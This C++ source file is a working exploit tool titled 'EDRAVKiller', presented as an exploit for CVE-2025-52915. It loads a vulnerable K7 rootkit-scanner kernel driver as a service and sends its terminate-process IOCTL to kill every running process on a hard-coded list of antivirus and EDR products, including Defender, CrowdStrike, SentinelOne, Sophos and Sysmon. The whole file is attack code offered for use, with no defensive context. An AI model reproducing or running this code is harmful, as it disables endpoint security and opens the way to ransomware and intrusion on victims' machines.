#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>

#define IOCTL_TERMINATE_PROCESS 0x222018

const wchar_t* listSecProcs[] = {
        L"EPProtectedService.exe",L"EPSecurityService",L"EPHost.Integrity.exe",
        L"MsMpEng.exe", L"MsSense.exe",L"MpDefenderCoreService.exe", L"SenseCncProxy.exe",
        L"CSFalconService.exe", L"CSFalconContainer.exe",
        L"cb.exe", L"cbdefense.exe", L"RepMgr.exe",
        L"SentinelAgent.exe", L"SentinelAgentWorker.exe",
        L"SAVService.exe", L"SophosUI.exe",L"McsAgent.exe",L"SEDService.exe", 
        L"SophosFS.exe", L"SophosFileScanner.exe",
        L"ccSvcHst.exe", L"Smc.exe",
        L"mfetp.exe", L"mcshield.exe",
        L"bdagent.exe", L"vsserv.exe",
        L"ekrn.exe", L"avp.exe",
        L"ntrtscan.exe", L"mbamservice.exe",
        L"CylanceSvc.exe", L"elastic-endpoint.exe",
        L"FortiTray.exe", L"Sysmon.exe", L"Sysmon64.exe"
};


struct TerminateProc {
    DWORD pid;
};


BOOL LoadDriver(LPCWSTR serviceName, LPCWSTR driverPath) {
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    

    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        printf("[!] OpenSCManager Failed (Admin priv) With Error: %d\n", GetLastError());
        return FALSE;
    }

    hService = CreateServiceW(
        hSCM,
        serviceName,
        serviceName,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        driverPath,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            hService = OpenServiceW(hSCM, serviceName, SERVICE_ALL_ACCESS);
        }

        if (!hService) {
            printf("[!] CreateService/OpenService Failed With Error: %d\n", GetLastError());
            CloseServiceHandle(hSCM);
            return FALSE;
        }
    }

    printf("[+] Service Created With Success\n");

    if (!StartService(hService, 0, NULL)) {
        if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[*] Service is already running!\n");
            return TRUE;
        }
        else {
            printf("[!] StartService Failed With Error: %d\n", GetLastError());
            return FALSE;
        }
    }
    else {
        printf("[+] Service Is Lauching With Success\n");
        return TRUE;
    }

    if (hService) CloseServiceHandle(hService);
    if (hSCM) CloseServiceHandle(hSCM);

    return TRUE;
}

DWORD GetPidByName(LPCWSTR procName) {

    HANDLE hSnapShot = NULL;
    DWORD pid = 0;

   
    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error: %d\n", GetLastError());
        return 0;
    }

    if (!Process32FirstW(hSnapShot, &pe32)) {
        printf("[!] Process32FirstW Failed With Error: %d\n", GetLastError);
        CloseHandle(hSnapShot);
        return 0;
    }

    do {
        
        if (_wcsicmp(procName, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32NextW(hSnapShot, &pe32));

    CloseHandle(hSnapShot);
    return pid;
}

HANDLE OpenDriver(LPCWSTR driverSymLink) {
    HANDLE hDriver = NULL;

    hDriver = CreateFileW(
        driverSymLink,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW Failed With Error: %d\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    printf("[+] Handle To The Driver Successfully Obtained!\n");
    return hDriver;
}

BOOL KillProcessById(HANDLE hDriver, DWORD pid) {

    TerminateProc termProc{};
    termProc.pid = pid;
    
    BOOL bResult = FALSE;
    DWORD bytesReturned;

    bResult = DeviceIoControl(
        hDriver,
        IOCTL_TERMINATE_PROCESS,
        &termProc,
        sizeof(TerminateProc),
        &termProc,
        sizeof(TerminateProc),
        &bytesReturned,
        NULL
    );

    if (!bResult) {
        printf("[!] DeviceIoControl Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    return bResult;
}


int main() {

    printf(" =========================================================== \n");
    printf("|         EDRAVKiller - CVE - 2025 - 52915 Exploit          |\n");
    printf("|            - Symbolic - Device : DosK7RKScnDrv -          |\n");
    printf(" =========================================================== \n");
    printf("");

    DWORD pid;

    if (LoadDriver(L"K7RKScan", L"C:\\Users\\Macsoft\\Documents\\Drivers\\K7rkscan.sys")) {
        printf("[+] Driver Loaded With Success!\n");
    }

    printf("[!] Scanning For AV/EDR Processes...\n");
    for (int i = 0; i < std::size(listSecProcs); ++i) {

        pid = GetPidByName(listSecProcs[i]);
        if (pid > 0) {

            HANDLE hDriver = OpenDriver(L"\\\\.\\DosK7RKScnDrv");
            printf("[+] Detected Security Solution \n");
            printf("\t\t [ %ls (PID: %d) ]\n", listSecProcs[i], pid);

            if (KillProcessById(hDriver, pid)) {
                printf("[+] Terminated Security Solution \n");
                printf("\t\t [%ls (PID: %d) ] \n", listSecProcs[i], pid);
            }

            CloseHandle(hDriver);

            
        }
    }

    printf("[!] Finished Operation! \n");
    return 0;
}